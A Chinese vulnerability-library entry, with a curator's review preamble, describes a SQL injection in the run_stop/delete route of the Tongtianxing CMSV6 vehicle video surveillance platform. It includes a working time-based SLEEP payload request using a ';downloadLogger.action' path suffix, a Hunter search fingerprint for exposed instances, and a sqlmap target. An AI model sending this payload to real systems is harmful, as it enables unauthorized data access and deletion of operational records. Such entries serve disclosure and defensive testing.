---
fofa: ""
source: "wy876 漏洞文库"
product: "通天星 CMSV6 车载视频监控平台"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
category_recommendation: "IOT安全/其他设备"
fofa_unverified: "web.body="
title: "通天星CMSV6车载视频监控平台run_stop_delete存在SQL注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：run_stopdelete.do;matrixsuffix;JSESSIONIDpresent;MySQL3seconds;deletionsideeffects"
side_effects: "未执行；本文需注意的操作影响：具体副作用：本文 delete 路由会涉及 运营停驶记录；把 ids=1 等正常参数当“安全对照”仍可能删除真实业务数据。原探针与方法保留，但测试对象必须是可恢复的隔离记录，须核事前/事后状态。"
source_status: "unknown"
id: "vw-68b6bdb7ec909b7e66a20e1e"
entity_id: "ve-68b6bdb7ec909b7e66a20e1e"
schema_version: "1"
---

## 核对与使用边界

- 测绘字段处置：原 fofa 字段为残缺表达式、错误平台语法或当前解析器不支持的形式，原值完整保留到 fofa_unverified，不把它当作已校验查询或受影响资产证据。正文检索方法保留；具体问题见下列原审阅项。


- 具体副作用：本文 delete 路由会涉及 运营停驶记录；把 ids=1 等正常参数当“安全对照”仍可能删除真实业务数据。原探针与方法保留，但测试对象必须是可恢复的隔离记录，须核事前/事后状态。
- JSESSIONID、矩阵路径后缀与 X-Forwarded-For 的出现不能替代路由鉴权证明；只有 URL/请求或 sqlmap 标签，没有配对响应/时延证据，短延迟不能直接判 SQLi。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：run_stopdelete.do;matrixsuffix;JSESSIONIDpresent;MySQL3seconds;deletionsideeffects

- **操作与副作用边界（1）**：URL对应删除运营停驶相关记录，正常ids1不应当安全对照。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **证据待核（2）**：JSESSIONID需判登录必要性，suffix路由鉴权机制未给。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **结论使用边界（3）**：sqlmap段仅目标URL，无实际命令/响应；3秒短时延需基线复测。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（4）**：无版本/修复，行业分类及Hunterfrontmatter残缺需统一。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 通天星CMSV6车载视频监控平台 run_stop/delete存在SQL注入漏洞

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台run_stop/delete存在SQL注入漏洞，攻击者可以通过构造恶意的SQL语句，成功注入并执行恶意数据库操作，可能导致敏感信息泄露、数据库被篡改或其他严重后果。

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征


# 四、漏洞复现
```plain
GET /run_stop/delete.do;downloadLogger.action?ids=1+AND+%28SELECT+4195+FROM+%28SELECT%28SLEEP%283%29%29%29BDMG%29 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=6D759FDA5ECC223DF29DFE45859F13DC
Upgrade-Insecure-Requests: 1
```


sqlmap

```plain
/run_stop/delete.do;downloadLogger.action?ids=1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qws2rrcs8vegdmm8>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
